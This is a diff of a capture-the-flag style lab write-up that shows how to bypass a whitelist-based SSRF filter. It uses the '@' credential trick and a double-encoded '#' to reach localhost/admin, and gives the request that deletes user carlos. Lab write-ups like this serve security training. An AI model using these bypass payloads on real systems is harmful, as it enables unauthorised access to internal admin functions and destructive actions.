@@ -1,10 +1,21 @@
 
-- **Author:** sonyahack1
-- **Date:** 24.04.2025
+<p align="center">
+  <img src="./screenshots/ssrf_logo_.png" alt="ssrf_logo"/>
+</p>
 
 ---
 
-## Intercept request
+- 🎯 **Target:** SSRF Lab - with whitelist-based input filter
+- 🧑‍💻 **Author:** `sonyahack1`
+- 📅 **Date:** 24.04.2025
+- 📊 **Difficulty:** EXPERT
+- 📁 **Category:** Web - SSRF (`white-based`)
+
+---
+
+## 🔍 Request interception
+
+> I intercept the request of stock check function to the server in `BurpSuite`:
 
 ```html
 
@@ -31,30 +42,30 @@ Te: trailers
 stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D14%26storeId%3D1
 
 ```
-> with 'Hackvertor' extension
+> with `Hackvertor` extension:
 
 ```none
 stockApi=<@urlencode>http://stock.weliketoshop.net:8080/product/stock/check?productId=14&storeId=1</@urlencode>
 ```
 
-> I need to bypass an anti-SSRF filter like white-based input filter
+> I need to bypass an `anti-SSRF` filter like white-based input filter
 > The server expects to receive a request with data that is allowed to be processed. For example, they are on a white list of allowed values.
 
 > Ok. I will try some methods that probably work.
 
-> I know that there is logic on the server side to check the domain that the request comes to. For example, if i try to change "stock.weliketoshop.net"
+> I know that there is logic on the server side to check the domain that the request comes to. For example, if i try to change `stock.weliketoshop.net`
 > to any other domain, then i will get an error from the server that **the request should be made only to "stock.weliketoshop.net"**.
 
 > For example:
 
-> Request
+> Request:
 
 ```none
 
 stockApi=<@urlencode>http://localhost/admin</@urlencode>
 
 ```
-> Response
+> Response:
 
 ```html
 
@@ -70,10 +81,10 @@ Content-Length: 58
 > **Note:** It is important to remember that I am trying to bypass the filtering at the level of the application code itself, so
 > that the server makes the request further away from itself, and then the request itself with the parsing function and url-encoding. 
 
-> When a URL has '@', everything before the '@' is considered credentials (login and password). And everything after the '@' is considered the real host.
+> When a URL has `@`, everything before the `@` is considered credentials (login and password). And everything after the `@` is considered the real host.
 > The '#' symbol in the URL is the beginning of a fragment that is not sent at all. It is only for browsers
 
-> Ok. add the '@' symbol before expected-host and send the request
+> Ok. add the `@` symbol before expected-host and send the request
 
 ```none
 
@@ -91,23 +102,27 @@ Content-Length: 3
 
 ```
 > Ok. Since the server handles such a request successfully, ignoring what is specified before the @ symbol, I just need to remove the extra part of the URL
-> fragment and leave only 'http://localhost/admin'.
+> fragment and leave only `http://localhost/admin`.
 
-> add the double url-encoded "#" symbol, because after the request, decoding will be done during parsing.
+> add the double url-encoded `#` symbol, because after the request, decoding will be done during parsing.
 
 
 
-```none
+```bash
+
 stockApi=http://localhost%2523@stock.weliketoshop.net/admin
+
 ```
 
 ![admin_interface](./screenshots/admin_interface.png)
 
-> delete Carlos user
+> I delete `Carlos` user:
 
 
-```none
+```bash
+
 stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
 ```
 
 ![lab_solved](./screenshots/lab_solved.png)
